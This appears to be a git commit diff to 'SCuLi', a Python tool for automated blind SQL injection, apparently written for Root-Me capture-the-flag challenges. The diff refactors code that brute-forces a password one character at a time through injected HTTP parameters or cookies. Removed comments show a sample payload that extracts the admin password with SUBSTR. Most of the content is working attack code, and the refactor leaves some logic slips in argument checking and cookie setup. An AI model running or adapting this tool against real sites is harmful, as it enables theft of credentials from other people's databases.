abd7ad0526fb578d391f4604383c3b0e6451b576
Baabbou <theo.klingler1@etu.unilim.fr>
2023-12-17 14:46:24 +0100

    Basic and error completed

--- code/head.py
+++ code/head.py
@@ -8,36 +8,6 @@ from html import escape
 
 def process(URL: str, TYPE: str, METHOD: str, PAYLOAD: str) -> int:
 
-    def __init_SCuLi() -> utils.SQLi:
-        SCuLi = utils.SQLi()
-        if not utils.ARGS.input:
-            SCuLi = utils.init_SQLi(SCuLi)
-        else:
-            print("[info] Hello Sir. All the job was made for you. Enjoy your meal my lord.")
-            with open(utils.ARGS.input, "r") as in_file:
-                in_json = in_file.read()
-                in_SCuLi = json.loads(in_json)
-                SCuLi.HTTP_params = in_SCuLi["HTTP_params"]
-                SCuLi.injection = in_SCuLi["injection"]
-                if "options" in in_SCuLi:
-                    SCuLi.options = in_SCuLi["options"]
-        return SCuLi
-
-    SCuLi = __init_SCuLi()
-    payload_1 = utils.adapt_payload(SCuLi, PAYLOAD)
-    # Find which param is the sqli
-    if not SCuLi.options["SQLi_in_cookie"]:
-        sqli_key = ""
-        for key, value in SCuLi.HTTP_params.items():
-            if "<>" in value:
-                sqli_key = key
-                break
-
-    print(f"[info] Payload is ready: `{payload_1}`")
-    print("[info] If SCuLi is blocked during process: add some `--delay`.")
-    utils.countdown()
-    total_start = time.time()
-
     prepare_functions = {
         "async_mode":{
             "basic": lambda url, method, static, arr_data, SQLtype : asyncio.run(req.prepare_async_requests(url, method, static, arr_data, SQLtype)),
@@ -49,26 +19,57 @@ def process(URL: str, TYPE: str, METHOD: str, PAYLOAD: str) -> int:
         }
     }
 
+    def __init_request() -> utils.HTTP_Request:
+        request = utils.HTTP_Request()
+        if not utils.ARGS.input:
+            print("[error] Not fixed yet => Give an input file.")
+            exit(1)
+            # request = utils.init_request(request)
+        else:
+            print("[info] Hello Sir. All the job was made for you. Enjoy your meal my lord.")
+            with open(utils.ARGS.input, "r") as in_file:
+                in_json = in_file.read()
+                in_request = json.loads(in_json)
+                request.params = in_request["params"]
+                if "cookie" in in_request:
+                    request.cookie = in_request["cookie"]
+                    if "<>" in request.cookie:
+                        request.SQLi = "cookie"
+        return request
+
+    request = __init_request()
+    # Find which param is the sqli
+    if request.SQLi == "params":
+        sqli_key = ""
+        for key, value in request.params.items():
+            if "<>" in value:
+                sqli_key = key
+                break
+
+    print("[info] If SCuLi is blocked during process: add some `--delay`.")
+    utils.countdown()
+    total_start = time.time()
+
     exfiltred_data = ""
     max_len_password = 32
-    data = SCuLi.HTTP_params.copy()
+    data = request.params.copy()
     mode = "async_mode" if utils.ARGS.speed else "sync_mode"
     for index in range(max_len_password):
-        payload_2 = payload_1.replace('<index>', str(index+1))
+        payload_1 = PAYLOAD.replace('<index>', str(index+1))
         arr_data = []
 
         for c in utils.ALPHABET:
-            if SCuLi.options["SQLi_in_cookie"]:
-                cookie = SCuLi.options["SQLi_in_cookie"].replace("<>", payload_2.replace("<char>", escape(c)))
-                arr_data.append(cookie)
-            else:
-                data[sqli_key] = SCuLi.HTTP_params[sqli_key].replace("<>", payload_2.replace('<char>', escape(c)))
+            if request.SQLi == "params":
+                data[sqli_key] = request.params[sqli_key].replace("<>", payload_1.replace('<char>', escape(c)))
                 arr_data.append(data.copy())
+            elif request.SQLi == "cookie":
+                cookie = request.cookie.replace("<>", payload_1.replace("<char>", escape(c)))
+                arr_data.append(cookie)
 
-        if SCuLi.options["SQLi_in_cookie"]:
-            exfiltred = prepare_functions[mode][TYPE](URL, METHOD, SCuLi.HTTP_params, arr_data, SQLtype="Cookie")
-        else:
+        if request.SQLi == "params":
             exfiltred = prepare_functions[mode][TYPE](URL, METHOD, utils.ARGS.cookie, arr_data, SQLtype="HTTP")
+        if request.SQLi == "cookie":
+            exfiltred = prepare_functions[mode][TYPE](URL, METHOD, request.params, arr_data, SQLtype="Cookie")
 
         if exfiltred:
             exfiltred_data += exfiltred
--- code/utils.py
+++ code/utils.py
@@ -14,26 +14,17 @@ QUERY_COUNT = 0
 TIMING = 0
 # -----------------------------------------------------
 
-
-class SQLi:
+class HTTP_Request:
     def __init__(self):
-        # HTTP_params: {"key1": "value1", "key2": "<sqli>",}
-        self.HTTP_params = {}
-        # injection: {"<data>": "password", "<table>": "users", "<filter>": "username", "<value>": "admin"}
-        # keys correspond to: (SELECT <data> FROM <table> WHERE <filter>='<value>')
-        self.injection = {
-            "<data>": "",
-            "<table>": "",
-            "<filter>": "",
-            "<value>": ""
-        }
-        self.options = {
-            "SQLi_in_cookie": None
-        }
+        # HTTP_params: {"key1": "value1", "key2": "<>",}
+        self.params = {}
+        # cookie: "PHPSESSID": MD5-STUFF; "id": "<>"
+        self.cookie = ""
+        # SQLi => Tells where the SQLi is located: params by default
+        self.SQLi = "params"
 
     def __str__(self):
-        query = preview_query("(SELECT <data> FROM <table> WHERE <filter>='<value>')", self.injection)
-        return f"{self.HTTP_params}\n{query}"
+        return f"{self.params}\n{self.cookie}"
 
 
 def check_args(args: dict) -> bool:
@@ -48,15 +39,9 @@ def check_args(args: dict) -> bool:
         print("[error] Invalid arguments: Bad type")
         return False
 
-    method = args.method
-    if method.upper() not in ["GET", "POST"]:
-        print("[error] Invalid arguments: Bad method")
-        return False
-
     payload = args.payload
-    if not ("<data>" in payload and "<table>" in payload and "<filter>" in payload and
-           "<value>" in payload and "<index>" in payload and "<char>" in payload):
-        print("[error] Invalid arguments: Payload missing argument =>\n\t['<data>', '<table>', '<filter>', '<value>', '<index>', '<char>'] are required")
+    if not "<index>" in payload and "<char>" in payload:
+        print("[error] Invalid arguments: Payload missing argument =>\n\t['<index>', '<char>'] are required")
         return False
 
     delay = args.delay
@@ -74,94 +59,13 @@ def check_args(args: dict) -> bool:
         with open(input_file, "r") as in_file:
             in_json = in_file.read()
             try:
-                json.loads(in_json)
+                data = json.loads(in_json)
+                if "params" not in data:
+                    raise json.decoder.JSONDecodeError
             except json.decoder.JSONDecodeError:
                 print("[error] Invalid arguments: Input file isn't a correct Json")
                 return False
     return True
-
-
-def init_SQLi(SCuLi: SQLi) -> SQLi:
-    while 1:
-        print("[setup] Let's setup this SQLi dude!")
-        try:
-            print("[setup] First, tell me how the form is made and where the sqli is.")
-            while 1:
-                user_input = questionary.select(
-                    f"Current HTTP params `{SCuLi.HTTP_params}`:",
-                    choices=["Add", "Remove", "Reset", "Done", "SQLi is in cookies"],
-                ).ask()
-                if user_input == "Done":
-                    count = 0
-                    for key, value in SCuLi.HTTP_params.items():
-                        if "<>" in value:
-                            count += 1
-                    if count != 1 and not SCuLi.options["SQLi_in_cookie"]:
-                        print("[warning] Only 1 HTTP param must be set as injectable => Fix it.")
-                        continue
-                    break
-                elif user_input == "Add":
-                    key = questionary.text("Key to add (CTRL+D to quit): ").ask()
-                    value = questionary.text("Value to set (`<>` for targeted input):").ask()
-                    SCuLi.HTTP_params[key] = value
-                elif user_input == "Remove":
-                    key = questionary.text("Key to remove (CTRL+D to quit): ").ask()
-                    SCuLi.HTTP_params.pop(key, None)
-                elif user_input == "Reset":
-                    SCuLi.HTTP_params = {}
-                elif user_input == "SQLi is in cookies":
-                    cookie = questionary.text("Cookie (example = `PHPSESSID=<>` && CTRL+D to quit): ").ask()
-                    if "<>" in cookie and "=" in cookie:
-                        SCuLi.options["SQLi_in_cookie"] = cookie
-                    else:
-                        print("[warning] The keyword `<>` need to be fixed in the cookie => Nothing was set")
-
-            injection = {
-                "<data>": "",
-                "<table>": "",
-                "<filter>": "",
-                "<value>": ""
-            }
-            query = "SELECT <data> FROM <table> WHERE <filter>='<value>'"
-            print("[setup] Great. Now let me know how to rule the SQL query.")
-            print(f"[setup] Each value will replace this keys:\n\t\t {query}")
-            for key, value in injection.items():
-                val = questionary.text(f"Value of {key} (CTRL+D to quit): ").ask()
-                injection[key] = val
-            SCuLi.injection = injection
-
-            print("[setup] Perfect. Let's recap':")
-            print(f"\tSQL query will look like this: {preview_query(query, SCuLi.injection)}")
-            print(f"\tHTTP requests params are: {SCuLi.HTTP_params}")
-            confirm = questionary.confirm("Is that all good?").ask()
-            if confirm:
-                print("[setup] Yehaa. Let's earn some Root-Me points!")
-                break
-            else:
-                print("[setup] Well, let's restart from the begining.")
-                continue
-        except EOFError:
-            print("[info] Quitting...")
-            exit(0)
-    return SCuLi
-
-
-def preview_query(payload: str, injection: dict) -> str:
-    prepared_query = payload
-    for key, value in injection.items():
-        prepared_query = prepared_query.replace(key, value)
-    return prepared_query
-
-
-def adapt_payload(SCuLi: SQLi, payload: str) -> str:
-    # ' AND SUBSTR((SELECT <data> FROM <table> WHERE <filter>='<value>'), <index>, 1)--
-    #   is changed into
-    # ' AND SUBSTR((SELECT password FROM users WHERE username='admin'), <index>, 1)--
-    payload = payload.replace('<data>', SCuLi.injection['<data>'])
-    payload = payload.replace('<table>', SCuLi.injection['<table>'])
-    payload = payload.replace('<filter>', SCuLi.injection['<filter>'])
-    payload = payload.replace('<value>', SCuLi.injection['<value>'])
-    return payload
 
 
 def select_reference_len(arr_len_responses: list) -> int:
@@ -198,3 +102,58 @@ def print_response(response: dict) -> str:
         output += f"{key}: {value}\n"
     output += f"\n{response['data']}"
     return output
+
+
+def init_request(request: HTTP_Request) -> HTTP_Request:
+    while 1:
+        print("[setup] Let's setup this SQLi dude!")
+        try:
+            print("[setup] First, tell me how the request is made and where the sqli is.")
+            while 1:
+                user_input = questionary.select(
+                    f"Current HTTP params `{request.params}`:",
+                    choices=["Add", "Remove", "Reset", "Done"],
+                ).ask()
+                if user_input == "Done":
+                    break
+                elif user_input == "Add":
+                    key = questionary.text("Key to add (CTRL+D to quit): ").ask()
+                    value = questionary.text("Value to set (`<>` for sqli input):").ask()
+                    request.params[key] = value
+                elif user_input == "Remove":
+                    key = questionary.text("Key to remove (CTRL+D to quit): ").ask()
+                    request.params.pop(key, None)
+                elif user_input == "Reset":
+                    request.params = {}
+
+            print("[setup] Good, tell me if there is cookies or headers.")
+            while 1:
+                user_input = questionary.select(
+                    f"Current HTTP params `{request.params}`:",
+                    choices=["Add", "Remove", "Reset", "Done"],
+                ).ask()
+                if user_input == "Done":
+                    break
+                elif user_input == "Add":
+                    key = questionary.text("Key to add (CTRL+D to quit): ").ask()
+                    value = questionary.text("Value to set (`<>` for targeted input):").ask()
+                    request.params[key] = value
+                elif user_input == "Remove":
+                    key = questionary.text("Key to remove (CTRL+D to quit): ").ask()
+                    request.params.pop(key, None)
+                elif user_input == "Reset":
+                    request.params = {}
+
+            print("[setup] Perfect. Let's recap':")
+            print(f"\tHTTP requests params are: {request.params}")
+            confirm = questionary.confirm("Is that all good?").ask()
+            if confirm:
+                print("[setup] Yehaa. Let's earn some Root-Me points!")
+                break
+            else:
+                print("[setup] Well, let's restart from the begining.")
+                continue
+        except EOFError:
+            print("[info] Quitting...")
+            exit(0)
+    return request
